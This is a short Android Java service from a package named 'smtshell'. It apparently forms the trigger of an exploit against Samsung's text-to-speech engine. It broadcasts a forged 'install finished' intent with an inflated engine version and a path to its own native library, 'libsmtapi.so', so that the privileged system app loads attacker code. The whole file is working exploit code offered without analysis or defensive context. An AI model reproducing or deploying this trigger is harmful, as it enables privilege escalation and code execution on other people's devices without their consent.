package com.samsung.SMT.lang.smtshell;

import android.app.IntentService;
import android.content.Intent;
import android.os.IBinder;

import androidx.annotation.Nullable;

import java.util.ArrayList;

public class MyService extends IntentService {

    public static boolean allow = false;

    public MyService() {
        super("MyService");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        if (!allow) return;

        allow = false;
        final String input = this.getApplicationInfo().nativeLibraryDir + "/" + "libsmtapi.so";

        Intent bi = new Intent();
        bi.setAction("com.samsung.SMT.ACTION_INSTALL_FINISHED");
        ArrayList<CharSequence> s = new ArrayList<>();
        bi.putCharSequenceArrayListExtra("BROADCAST_CURRENT_LANGUAGE_INFO", s);
        bi.putExtra("BROADCAST_CURRENT_LANGUAGE_VERSION", "99999");
        bi.putCharSequenceArrayListExtra("BROADCAST_DB_FILELIST", s);
        bi.putExtra("SMT_ENGINE_VERSION", 0x2590cd5b);//installed version is 361811291
        bi.putExtra("SMT_ENGINE_PATH", input);
        sendBroadcast(bi);
    }
}
